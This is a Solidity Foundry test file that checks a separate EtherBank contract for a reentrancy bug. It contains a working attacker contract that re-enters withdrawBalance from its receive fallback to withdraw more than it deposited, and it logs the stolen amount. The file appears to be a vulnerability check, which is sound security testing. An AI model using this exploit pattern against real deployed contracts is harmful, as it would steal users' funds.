// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etherbank.sol";

contract MaliciousContract {
    EtherBank public etherBank;
    uint public attackCount;

    constructor(address _etherBankAddress) {
        etherBank = EtherBank(_etherBankAddress);
    }

    // Fallback function that will be called when Ether is sent to this contract
    receive() external payable {
        if (attackCount < 1) {
            attackCount++;
            etherBank.withdrawBalance();
        }
    }

    function attack() external payable {
        // Deposit some Ether to have a balance to withdraw
        etherBank.addToBalance{value: msg.value}();
        // Initiate the attack by withdrawing
        etherBank.withdrawBalance();
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}

contract EtherBankTest is Test {
    EtherBank public etherBank;
    MaliciousContract public attacker;
    address public owner = address(1);
    address public user = address(2);
    uint public initialDeposit = 1 ether;

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(user, 10 ether);
        
        vm.startPrank(owner);
        etherBank = new EtherBank();
        vm.stopPrank();

        attacker = new MaliciousContract(address(etherBank));
        vm.deal(address(attacker), initialDeposit);
    }

    function testReentrancyAttack() public {
        // Normal user deposits funds
        vm.prank(user);
        etherBank.addToBalance{value: initialDeposit}();

        console.log("--- BEFORE-Trigger Attack ---");
        uint bankBalanceBefore = etherBank.getTotalBankBalance();
        uint attackerBalanceBefore = attacker.getBalance();
        console.log("Bank Balance (Before):", bankBalanceBefore);
        console.log("Attacker Balance (Before):", attackerBalanceBefore);

        // Ensure test contract has enough ETH to fund attack
        vm.deal(address(this), initialDeposit);

        console.log("--- Trigger Attack ---");
        attacker.attack{value: initialDeposit}();

        console.log("--- AFTER-Trigger Attack ---");
        uint bankBalanceAfter = etherBank.getTotalBankBalance();
        uint attackerBalanceAfter = attacker.getBalance();
        console.log("Bank Balance (After):", bankBalanceAfter);
        console.log("Attacker Balance (After):", attackerBalanceAfter);

        // Vulnerability verdict based on bank balance delta
        if (bankBalanceAfter < bankBalanceBefore) {
            console.log("Vulnerability Exists: Reentrancy attack stolen %d wei", bankBalanceBefore - bankBalanceAfter);
        } else {
            console.log("Vulnerability not Exist: Bank funds unchanged");
        }
    }
}